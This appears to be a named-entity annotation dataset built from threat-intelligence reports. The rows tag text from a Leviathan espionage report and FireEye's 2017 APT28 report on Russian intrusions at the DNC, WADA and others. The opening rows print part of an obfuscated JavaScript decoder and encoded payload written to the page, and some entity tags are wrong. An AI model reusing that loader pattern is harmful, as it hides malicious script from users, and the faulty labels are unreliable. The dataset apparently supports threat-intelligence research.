                                               string += String.fromCharCode(c);

                                               i++;

                                   } else if((c > 191) && (c ",O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor," 224)) {

                                               c2 = utftext.charCodeAt(i+1);

                                               string += String.fromCharCode(((c & 31) ",O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor," 6) | (c2 & 63));

                                               i += 2;

                                   } else {

                                               c2 = utftext.charCodeAt(i+1);

                                               c3 = utftext.charCodeAt(i+2);

                                               string += String.fromCharCode(((c & 15) ",O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor, 12) | ((c2 & 63) ,O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor,<,O
Leviathan_Espionage_actor," 6) | (c3 & 63));

                                               i += 3;

                                   }

                       }

                       return string;

           }

var decodeme =
""s2S9NF0GCBRBRvY9s2pzN5nHsBk+N2oT8KWvsKYpNBpzR4nTNvYGNuNdOFoDbZeTQtkm8unzAtq9wK+zCLII""

var res = decode(decodeme);



",O
Leviathan_Espionage_actor,9/10/2018,timestamp
Leviathan_Espionage_actor, ,O
Leviathan_Espionage_actor,Leviathan,threat_actor
Leviathan_Espionage_actor,": Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 12/12

document.write(res);",O
APT28-Center-of-Storm-2017,FireEye,org
APT28-Center-of-Storm-2017," iSIGHT INTELLIGENCE

",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017," STRATEGICALLY EVOLVES  
ITS CYBER OPERATIONS

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,":  
AT THE CENTER  
OF THE STORM

SPECIAL REPORT / JANUARY 2017



 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM i

CONTENTS

Introduction 1

Overview 2

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," Targeting And Intrusion Activity 3

Table 1 -",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," Targeting of Political Entities and Intrusion Activity 4

Table 2 -",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," Network Activity Has Likely Supported 
Information Operations  5

From Olympic Slight to Data Leak: 

Investigating",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," at the World Anti-Doping Agency 6

Conclusion 8

Appendix 9



The ",O
APT28-Center-of-Storm-2017,Democratic National Committee’s,org
APT28-Center-of-Storm-2017, (,O
APT28-Center-of-Storm-2017,DNC,org
APT28-Center-of-Storm-2017,") June 

2016 announcement attributing its network breach 

to the",O
APT28-Center-of-Storm-2017,Russian Government,org
APT28-Center-of-Storm-2017," triggered an international 

debate over Russia’s sponsorship of information 

operations against the ",O
APT28-Center-of-Storm-2017,U.S.,country
APT28-Center-of-Storm-2017," 

INTRODUCTION

At issue is the question of proof: did the",O
APT28-Center-of-Storm-2017,Russian Government,org
APT28-Center-of-Storm-2017," direct the group 
responsible for the breaches and related data leaks? If so, is this simply a matter  
of accepted state espionage, or did it cross a line? Was the ",O
APT28-Center-of-Storm-2017,DNC,org
APT28-Center-of-Storm-2017," breach part  
of a concerted effort by the",O
APT28-Center-of-Storm-2017,Russian Government,org
APT28-Center-of-Storm-2017, to interfere with the ,O
APT28-Center-of-Storm-2017,U.S.,country
APT28-Center-of-Storm-2017," 
presidential election?

Unfortunately, we have failed to ask the most consequential question: how will 
",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017," continue to employ a variety of methods, including hacks and leaks,  
to undermine the institutions, policies, and actors that the",O
APT28-Center-of-Storm-2017,Russian Government,org
APT28-Center-of-Storm-2017," 
perceives as constricting and condemning its forceful pursuit of its state aims? 

Our visibility into the operations of",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," - a group we believe the Russian 
Government sponsors - has given us insight into some of the government’s  
targets, as well as its objectives and the activities designed to further them.  
We have tracked and profiled this group through multiple investigations, endpoint 
and network detections, and continuous monitoring. Our visibility into APT28’s 
operations, which date to at least 2007, has allowed us to understand the group’s 
malware, operational changes, and motivations. This intelligence has been critical 
to protecting and informing our clients, exposing this threat, and strengthening  
our confidence in attributing",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017, to the,O
APT28-Center-of-Storm-2017,Russian Government,org
APT28-Center-of-Storm-2017,".

 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM 1



 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM 2

OVERVIEW

On ",O
APT28-Center-of-Storm-2017,"December 29, 2016",timestamp
APT28-Center-of-Storm-2017,", the ",O
APT28-Center-of-Storm-2017,Department of Homeland Security,org
APT28-Center-of-Storm-2017, (,O
APT28-Center-of-Storm-2017,DHS,org
APT28-Center-of-Storm-2017,") 
and ",O
APT28-Center-of-Storm-2017,Federal Bureau of Investigation,org
APT28-Center-of-Storm-2017, (,O
APT28-Center-of-Storm-2017,FBI,org
APT28-Center-of-Storm-2017,") released a Joint Analysis 
Report confirming FireEye’s long held public assessment that the Russian 
Government sponsors",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,". Since at least 2007,",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," has engaged  
in extensive operations in support of Russian strategic interests.  
The group, almost certainly compromised of a sophisticated and prolific 
set of developers and operators, has historically collected intelligence on 
defense and geopolitical issues.",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," espionage activity has primarily 
targeted entities in the ",O
APT28-Center-of-Storm-2017,U.S.,country
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,Europe,country
APT28-Center-of-Storm-2017,", and the countries of the former 
",O
APT28-Center-of-Storm-2017,Soviet Union,country
APT28-Center-of-Storm-2017,", including governments and militaries, defense attaches, 
media entities, and dissidents and figures opposed to the current ",O
APT28-Center-of-Storm-2017,"Russian 
Government",org
APT28-Center-of-Storm-2017,".

Over the past two years,",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017," appears to have increasingly leveraged 
",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," to conduct information operations commensurate with broader 
strategic military doctrine. After compromising a victim organization, 
",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," will steal internal data that is then leaked to further political 
narratives aligned with Russian interests. To date these have included  
the conflict in ",O
APT28-Center-of-Storm-2017,Syria,country
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,NATO,org
APT28-Center-of-Storm-2017,"-Ukraine relations, the ",O
APT28-Center-of-Storm-2017,European Union,country
APT28-Center-of-Storm-2017," refugee 
and migrant crisis, the 2016 Olympics and Paralympics Russian athlete 
doping scandal, public accusations regarding Russian state-sponsored 
hacking, and the 2016 ",O
APT28-Center-of-Storm-2017,U.S.,country
APT28-Center-of-Storm-2017," presidential election. 

This report details our observations of APT28’s 
targeting, and our investigation into a related 
breach. We also provide an update on shifts in the 
group’s tool development and use, and summarize 
the tactics",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," employs to compromise its victims.



 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM 3

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," TARGETING AND  
INTRUSION ACTIVITY

In ",O
APT28-Center-of-Storm-2017,October 2014,timestamp
APT28-Center-of-Storm-2017,",",O
APT28-Center-of-Storm-2017,FireEye,org
APT28-Center-of-Storm-2017, released,O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": A Window into 
Russia’s Cyber Espionage Operations?, and characterized 
APT28’s activity as aligning with the Russian Government’s 
strategic intelligence requirements. While tracking",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,", 
we noted the group’s interest in foreign governments and 
militaries, particularly those of European and Eastern  
European nations, as well as regional security organizations, 
such as the ",O
APT28-Center-of-Storm-2017,North Atlantic Treaty Organization,org
APT28-Center-of-Storm-2017, (,O
APT28-Center-of-Storm-2017,NATO,org
APT28-Center-of-Storm-2017,")  
and the Organization for Security and Cooperation  
in ",O
APT28-Center-of-Storm-2017,Europe,country
APT28-Center-of-Storm-2017," (OSCE), among others. Table 1 highlights  
some recent examples of this activity.



 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM 4

1.  Gauquelin, Blaise. “La Russie soupçonnée d’être responsable d’un piratage informatique contre l’OSCE.” Le Monde. 28 Dec. 2016. Web. 29 Dec. 2016. 
2.  Trend Micro refers to activity corresponding to FireEye’s",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," as “Pawn Storm.”
3.  Hacquebord Feike. “Pawn Storm Targets German Christian Democratic Union.” Trend Micro. 11 May 2016. Web. 29 Dec. 2016. 
4.  Hacquebord Feike. “Pawn Storm’s Domestic Spying Campaign Revealed; Ukraine and US Top Global Targets.” TrendLabs Security Intelligence Blog, Trend Micro. 18 August 2015. Web. 29 Dec.  2016. 
5.  “Neuer Hackerangriff auf Bundespolitiker / BSI warnt Parteien vor Cyberangriffen.” Westdeutscher Rundfunk. 20 Sept. 2016. Web. 29 Dec. 2016. 
 6.  “Russia ‘was Behind German Parliament Hack.’” The BBC. 13 May 2016. Web. 29 Dec. 2016. 
 7, Kharouni, Loucif. et al. “Operation Pawn Storm: Using Decoys to Evade Detection.” Trend Micro. 22 Oct. 2014. Web. 3 Jan. 2017. 

TABLE 1 :",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," TARGETING OF POLITICAL ENTITIES AND INTRUSION ACTIVITY

ENTIT Y TIMEFRAME",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," TARGETING AND INTRUSION ACTIVIT Y 

OSCE NOVEMBER 2016
The OSCE confirmed that it had suffered an intrusion,  
which a Western intelligence service attributed to",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,".1 

Germany's Christian  
Democratic Union (CDU)

APRIL - MAY 2016

Researchers at Trend Micro observed",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,"  establish a fake  
CDU email server and launch phishing emails against CDU  
members in an attempt to obtain their email credentials and access 
their accounts.2,3 

Pussy Riot AUGUST 2015
",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," targets Russian rockers and dissidents Pussy Riot via 
spear-phishing emails.4

",O
APT28-Center-of-Storm-2017,NATO,org
APT28-Center-of-Storm-2017,", Afghan Ministry  
of Foreign Affairs, Pakistani 
Military

JULY 2015
",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," used two domains (nato-news.com and bbc-news.org) to host 
an ",O
APT28-Center-of-Storm-2017,Adobe Flash,software
APT28-Center-of-Storm-2017, zero-day exploit to target ,O
APT28-Center-of-Storm-2017,NATO,org
APT28-Center-of-Storm-2017,", the ",O
APT28-Center-of-Storm-2017,"Afghan Ministry 
of Foreign Affairs",org
APT28-Center-of-Storm-2017,", and the ",O
APT28-Center-of-Storm-2017,Pakistani military,org
APT28-Center-of-Storm-2017,".

",O
APT28-Center-of-Storm-2017,German Bundestag,org
APT28-Center-of-Storm-2017,"  
& Political Parties

",O
APT28-Center-of-Storm-2017,JUNE 2015,timestamp
APT28-Center-of-Storm-2017,"

Germany’s Federal Office for Security in Information Technology (BSI) 
announced that",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," was likely responsible for the spear phishing 
emails sent to members of several German political parties.  The head 
of Germany’s domestic intelligence agency, ",O
APT28-Center-of-Storm-2017,Bundesamt für Verfassungsschutz,org
APT28-Center-of-Storm-2017, (,O
APT28-Center-of-Storm-2017,BfV,org
APT28-Center-of-Storm-2017,"), also attributed the ",O
APT28-Center-of-Storm-2017,JUNE 2015,timestamp
APT28-Center-of-Storm-2017," compromise of 
the ",O
APT28-Center-of-Storm-2017,Bundestag,org
APT28-Center-of-Storm-2017,’s networks to,org
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,".5,6 

",O
APT28-Center-of-Storm-2017,"Kyrgyzstan Ministry  
of Foreign Affairs",org
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,OCTOBER 2014 THROUGH SEPTEMBER 2015,timestamp
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,FireEye,org
APT28-Center-of-Storm-2017," iSight Intelligence identified changes made to domain name 
server (DNS) records that suggest that",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," intercepted email traf-
fic from the ",O
APT28-Center-of-Storm-2017,Kyrgyzstan Ministry of Foreign Affairs,org
APT28-Center-of-Storm-2017," after maliciously 
modifying DNS records of the ministry’s authoritative DNS servers.

",O
APT28-Center-of-Storm-2017,Polish Government,org
APT28-Center-of-Storm-2017," & Power 
Exchange websites

",O
APT28-Center-of-Storm-2017,"JUNE AND  
SEPTEMBER 2014",org
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," employed “Sedkit” in conjunction with strategic web compro-
mises to deliver “Sofacy” malware on Polish Government websites, 
and the websites of Polish energy company Power Exchange.7 



 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM 5

TABLE 2 :",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," NETWORK ACTIVITY HAS LIKELY SUPPORTED INFORMATION OPERATIONS

Since 2014,",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," network activity has likely supported 
information operations designed to influence the domestic 
politics of foreign nations. Some of these operations have 
involved the disruption and defacement of websites, false flag 
operations using false hacktivist personas, and the theft of 
data that was later leaked publicly online.  

Table 2 highlights incidents in which victims suffered 
a compromise that",O
APT28-Center-of-Storm-2017,FireEye,org
APT28-Center-of-Storm-2017," iSIGHT Intelligence, other 
authorities, or the victims themselves later attributed to the 
group we track as",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,". All of these operations have aimed 
to achieve a similar objective: securing a political outcome 
beneficial to",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017,".

VICTIM TIMEFRAME",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," NETWORK ACTIVIT Y ASSOCIATED INFORMATION OPERATIONS 

ACTIVIT Y

World Anti-Doping  
Agency (",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017,")

SEPTEMBER 2016
On September 13, ",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017, confirmed that,O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," 
had compromised its networks and accessed 
athlete medical data.8  

On September 12, 2016, the “Fancy Bears’ Hack Team” persona 
claimed to have compromised ",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017," and released athletes’ 
medical records as “proof of American athletes taking dop-
ing.”9 

",O
APT28-Center-of-Storm-2017,U.S.,country
APT28-Center-of-Storm-2017," Democratic National 
Committee (",O
APT28-Center-of-Storm-2017,DNC,org
APT28-Center-of-Storm-2017,")

APRIL –  
SEPTEMBER 2016

The ",O
APT28-Center-of-Storm-2017,DNC,org
APT28-Center-of-Storm-2017," announced it had suffered a network 
compromise and that a subsequent investigation 
found evidence of two breaches, attributed to 
",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017, and APT29. ,O
APT28-Center-of-Storm-2017,FireEye,org
APT28-Center-of-Storm-2017," analyzed the mal-
ware found on ",O
APT28-Center-of-Storm-2017,DNC,org
APT28-Center-of-Storm-2017," networks and determined 
that it was consistent with our previous observa-
tions of",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," tools.10,11

In",O
APT28-Center-of-Storm-2017,June 2016,timestamp
APT28-Center-of-Storm-2017,", shortly after the DNC’s announcement, the ",O
APT28-Center-of-Storm-2017,Guccifer 2.0,identity
APT28-Center-of-Storm-2017, persona claimed responsibility for the ,O
APT28-Center-of-Storm-2017,DNC,org
APT28-Center-of-Storm-2017," breach 
and leaked documents taken from the organization’s network.  
",O
APT28-Center-of-Storm-2017,Guccifer 2.0,identity
APT28-Center-of-Storm-2017, continued to leak batches of ,O
APT28-Center-of-Storm-2017,DNC,org
APT28-Center-of-Storm-2017," documents 
through ",O
APT28-Center-of-Storm-2017,"September.12,13",timestamp
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,John Podesta,identity
APT28-Center-of-Storm-2017,"
MARCH –  

NOVEMBER 2016

Investigators found that John Podesta, ",O
APT28-Center-of-Storm-2017,"Hillary 
Clinton",identity
APT28-Center-of-Storm-2017,"’s presidential campaign chairman, was 
one of thousands of individuals targeted in a 
mass phishing scheme using shortened URLs 
that security researchers attributed to",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,".14  

",O
APT28-Center-of-Storm-2017,Throughout October and into early November,timestamp
APT28-Center-of-Storm-2017,", WikiLeaks pub-
lished 34 batches of email correspondence stolen from ",O
APT28-Center-of-Storm-2017,"John 
Podesta",identity
APT28-Center-of-Storm-2017,"’s personal email account. Correspondence of other 
individuals targeted in the same phishing campaign, including 
former Secretary of State ",O
APT28-Center-of-Storm-2017,Colin Powell,identity
APT28-Center-of-Storm-2017, and ,O
APT28-Center-of-Storm-2017,Clinton,identity
APT28-Center-of-Storm-2017," campaign 
staffer ",O
APT28-Center-of-Storm-2017,William Rinehart,identity
APT28-Center-of-Storm-2017,", were published on the  
“DC Leaks” website.15  

",O
APT28-Center-of-Storm-2017,U.S.,country
APT28-Center-of-Storm-2017, ,O
APT28-Center-of-Storm-2017,"Democratic  
Congressional Campaign 
Committee",org
APT28-Center-of-Storm-2017, (,O
APT28-Center-of-Storm-2017,DCCC,org
APT28-Center-of-Storm-2017,")

",O
APT28-Center-of-Storm-2017,"MARCH -  
OCTOBER 2016",timestamp
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,In July,timestamp
APT28-Center-of-Storm-2017,", the ",O
APT28-Center-of-Storm-2017,DCCC,org
APT28-Center-of-Storm-2017," announced that it was investi-
gating an ongoing “cybersecurity incident” that 
the ",O
APT28-Center-of-Storm-2017,FBI,org
APT28-Center-of-Storm-2017," believed was linked to the compromise 
of the ",O
APT28-Center-of-Storm-2017,DNC,org
APT28-Center-of-Storm-2017,".   House Speaker Nancy Pelosi 
later confirmed that the ",O
APT28-Center-of-Storm-2017,DCCC,org
APT28-Center-of-Storm-2017," had suffered a 
network compromise.   Investigators indicated 
that the actors may have gained access to ",O
APT28-Center-of-Storm-2017,DCCC,org
APT28-Center-of-Storm-2017," 
systems as early as ",O
APT28-Center-of-Storm-2017,"March.16,17,18",timestamp
APT28-Center-of-Storm-2017,"

In August, the ",O
APT28-Center-of-Storm-2017,Guccifer 2.0,identity
APT28-Center-of-Storm-2017," persona contacted reporters cov-
ering ",O
APT28-Center-of-Storm-2017,U.S.,country
APT28-Center-of-Storm-2017, ,O
APT28-Center-of-Storm-2017,House of Representative races,org
APT28-Center-of-Storm-2017," to announce newly 
leaked documents from the ",O
APT28-Center-of-Storm-2017,DCCC,org
APT28-Center-of-Storm-2017," pertaining to Democratic  
candidates. From ",O
APT28-Center-of-Storm-2017,August to October,timestamp
APT28-Center-of-Storm-2017,", ",O
APT28-Center-of-Storm-2017,Guccifer 2.0,identity
APT28-Center-of-Storm-2017," posted sev-
eral additional installments of what appear to be internal ",O
APT28-Center-of-Storm-2017,DCCC,org
APT28-Center-of-Storm-2017," 
documents on “his” ",O
APT28-Center-of-Storm-2017,WordPress,software
APT28-Center-of-Storm-2017," site.19,20

TV5Monde
",O
APT28-Center-of-Storm-2017,FEBRUARY 2015,timestamp
APT28-Center-of-Storm-2017,", 

",O
APT28-Center-of-Storm-2017,APRIL 2015,timestamp
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,In February,timestamp
APT28-Center-of-Storm-2017,",",O
APT28-Center-of-Storm-2017,FireEye,org
APT28-Center-of-Storm-2017, identified ,O
APT28-Center-of-Storm-2017,CORESHELL,software
APT28-Center-of-Storm-2017," 
traffic beaconing from TV5Monde’s network, 
confirming that",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," had compromised TV-
5Monde’s network. 

In ",O
APT28-Center-of-Storm-2017,April 2015,timestamp
APT28-Center-of-Storm-2017,", alleged pro-ISIS hacktivist group ",O
APT28-Center-of-Storm-2017,CyberCaliphate,threat_actor
APT28-Center-of-Storm-2017," 
defaced TV5Monde’s websites and social media profiles and 
forced the company’s 11 broadcast channels offline. ",O
APT28-Center-of-Storm-2017,FireEye,org
APT28-Center-of-Storm-2017," 
identified overlaps between the domain registration details of 
CyberCaliphate’s website and",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," infrastructure.21

",O
APT28-Center-of-Storm-2017,"Ukrainian Central  
Election Commission ",org
APT28-Center-of-Storm-2017,"
(",O
APT28-Center-of-Storm-2017,CEC,org
APT28-Center-of-Storm-2017,")

",O
APT28-Center-of-Storm-2017,MAY 2014,timestamp
APT28-Center-of-Storm-2017,"
Ukrainian officials revealed that the investigation 
into the compromise of the ",O
APT28-Center-of-Storm-2017,CEC,org
APT28-Center-of-Storm-2017,"’s internal net-
work identified malware traced to",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,".22 

",O
APT28-Center-of-Storm-2017,During the May 2014,timestamp
APT28-Center-of-Storm-2017," Ukrainian presidential election, purported 
pro-Russian hacktivists ",O
APT28-Center-of-Storm-2017,CyberBerkut,threat_actor
APT28-Center-of-Storm-2017," conducted a series of mali-
cious activities against the ",O
APT28-Center-of-Storm-2017,CEC,org
APT28-Center-of-Storm-2017," including a system compromise, 
data destruction, a data leak, a distributed denial-of-service 
(DDoS) attack, and an attempted defacement of the ",O
APT28-Center-of-Storm-2017,CEC,org
APT28-Center-of-Storm-2017," web-
site with fake election results.23  

8. “WADA Confirms Attack by Russian Cyber Espionage Group.” World Anti-Doping Agency. 13 Sept. 2016. Web. 29 Dec. 2016. 
9. Fancy Bears’ HT (fancybears). “@AnonPress Greetings. We hacked #",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017,". We have Proof of American Athletes taking doping. Fancybear.net.” 12 Sept. 2016, 4:12 PM. Tweet. 
10. CrowdStrike refers to activity corresponding to FireEye’s",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," and APT29 as “Fancy Bear” and “Cozy Bear,” respectively.
11.  “Nakashima, Ellen. “Cyber Researchers Confirm",O
APT28-Center-of-Storm-2017,Russian Government,org
APT28-Center-of-Storm-2017, Hack of ,O
APT28-Center-of-Storm-2017,Democratic National Committee,org
APT28-Center-of-Storm-2017,.” The Washington Post. 20,O
APT28-Center-of-Storm-2017,June 2016,timestamp
APT28-Center-of-Storm-2017,". Web. 29 Dec. 2016. 
12.  “Rid, Thomas. “All Signs Point to",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017, Being Behind the ,O
APT28-Center-of-Storm-2017,DNC,org
APT28-Center-of-Storm-2017," Hack.” Motherboard, Vice. 25 July 2016. Web. 29 Dec. 2016. 
13.   “Bennett, Cory. “Guccifer 2.0 Drops More ",O
APT28-Center-of-Storm-2017,DNC,org
APT28-Center-of-Storm-2017, Docs.” Politico. 13 Sept. 2016. Web. 2 Jan. 2017. ,O
APT28-Center-of-Storm-2017,<,O
APT28-Center-of-Storm-2017,">
14. Perlroth, Nicole. Shear, Michael D. “Private Security Group Says",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017," was Behind John Podesta’s Email Hack.” The New York Times. 21 Oct. 2016. Web. 2 Jan. 2017. 
15.  “Franceschi-Bicchierai, Lorenzo. “How Hackers Broke Into John Podesta and Colin Powell’s Gmail Accounts.” 20 Oct. 2016. Web. 2 Jan. 2017. 
16. “Nakashima, Ellen. “FBI Probes Suspected Breach of Another Democratic Organization by Russian Hackers.” The Washington Post. 29 July 2016. Web. 29 Dec. 2016. 
17.  “Pelosi, Nancy. “DCCC Cyber Breach.” 13 August 2016. Email. ",O
APT28-Center-of-Storm-2017,U.S.,country
APT28-Center-of-Storm-2017," House of Representatives. Washington, DC. Politico. Web. 29 Dec. 2016. 
18.  “Lipton, Eric. Shane, Scott. “Democratic House Candidates Were Also Targets of Russian Hacking.” The New York Times. 13 Dec. 2016. Web. 29 Dec. 2016. 
19.  Ibid.



 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM 6

FROM OLYMPIC SLIGHT TO DATA LEAK: 
Investigating",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," at the World Anti-Doping Agency

As news of the ",O
APT28-Center-of-Storm-2017,DNC,org
APT28-Center-of-Storm-2017," breach spread,",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," was preparing for another set 
of operations: countering the condemnation that",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017," was facing after 
doping allegations and a threatened blanket ban of the Russian team 
from the upcoming Rio Games.",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017,", like many nations, has long viewed 
success in the Olympic Games as a source of national prestige and soft 
power on the world stage. The doping allegations and prospective ban 
from the Games further ostracized",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017,", and likely provided motivation 
to actively counter the allegations by attempting to discredit anti-doping 
agencies and policies. Our investigation of APT28’s compromise of 
WADA’s network, and our observations of the surrounding events reveal 
how",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017," sought to counteract a damaging narrative and delegitimize 
the institutions leveling criticism. 

ALLEGATIONS OF RUSSIAN ATHLETES’ WIDESPREAD DOPING
NOV (2015)

",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017," declares the 
",O
APT28-Center-of-Storm-2017,"Russian Anti-Doping 
Agency",org
APT28-Center-of-Storm-2017, (,O
APT28-Center-of-Storm-2017,RUSADA,org
APT28-Center-of-Storm-2017,") non-
compliant.24

",O
APT28-Center-of-Storm-2017,JULY 18,timestamp
APT28-Center-of-Storm-2017," 

",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017,"-commissioned 
report documents 
evidence of Russian 
athletes’ widespread 
doping.25

",O
APT28-Center-of-Storm-2017,AUG 4,timestamp
APT28-Center-of-Storm-2017," 

Russian athletes were 
barred from competing 
in the Olympic Games.26

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017, COMPROMISES ,O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,EARLY AUG,timestamp
APT28-Center-of-Storm-2017," 

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," sends spear 
phishing emails to 
",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017," employees.27

",O
APT28-Center-of-Storm-2017,AUG 10,timestamp
APT28-Center-of-Storm-2017," 

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," uses a legitimate 
user account belonging 
to a Russian athlete to 
log into WADA’s Anti-
Doping Administration 
and Management 
System (ADAMS) 
database.28

",O
APT28-Center-of-Storm-2017,AUG 25-SEP 12,timestamp
APT28-Center-of-Storm-2017,"

",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017," gains access 
to an ",O
APT28-Center-of-Storm-2017,"International 
Olympic Committee",org
APT28-Center-of-Storm-2017," 
account created 
specifically for the 2016 
Olympic Games, and 
views and downloads 
athlete data.29



 SPECIAL REPORT /",O
APT28-Center-of-Storm-2017,APT28,threat_actor
APT28-Center-of-Storm-2017,": AT THE CENTER OF THE STORM 7

Based on this timeline of leak and threatened leak 
activity, as well as strikingly similar characteristics and 
distribution methods shared between @anpoland and 
“",O
APT28-Center-of-Storm-2017,Fancy Bears,threat_actor
APT28-Center-of-Storm-2017,"’ Hack Team,” the same operators are highly 
likely behind the two personas. ",O
APT28-Center-of-Storm-2017,WADA,org
APT28-Center-of-Storm-2017," officials, citing 
evidence provided by law enforcement, stated that the 
threat activity originated in",O
APT28-Center-of-Storm-2017,RUSSIA,country
APT28-Center-of-Storm-2017,", possibly in retaliation 

for WADA’s exposure of Russia’s expansive, state-run 
doping.38 The statement prompted denials from the 
",O
APT28-Center-of-Storm-2017,Russian Government,org
